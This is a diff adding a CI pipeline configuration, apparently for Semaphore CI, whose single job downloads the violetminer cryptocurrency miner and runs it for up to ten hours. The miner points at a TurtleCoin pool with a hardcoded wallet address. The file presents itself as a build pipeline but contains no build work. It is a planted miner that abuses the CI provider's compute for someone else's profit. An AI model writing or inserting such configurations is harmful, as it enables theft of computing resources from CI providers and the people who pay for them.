@@ -1,0 +1,18 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+execution_time_limit:
+  hours: 10
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #1'
+          commands:
+            - 'wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz'
+            - tar -xf violetminer-linux-v0.2.2.tar.gz
+            - cd violetminer-linux-v0.2.2
+            - './violetminer --pool turtlecoin.herominers.com:10381 --username TRTLv16hpWW3h2tpJu9NsfUK19fMpisgg6PP5MQ1i8VsF5GDCBw6DQ7YWNh8cuPZsJ3sXaAfmKS7bKYo9w2yYdEPFHSdXJ8G9HJ --password sabri --algorithm turtlecoin'
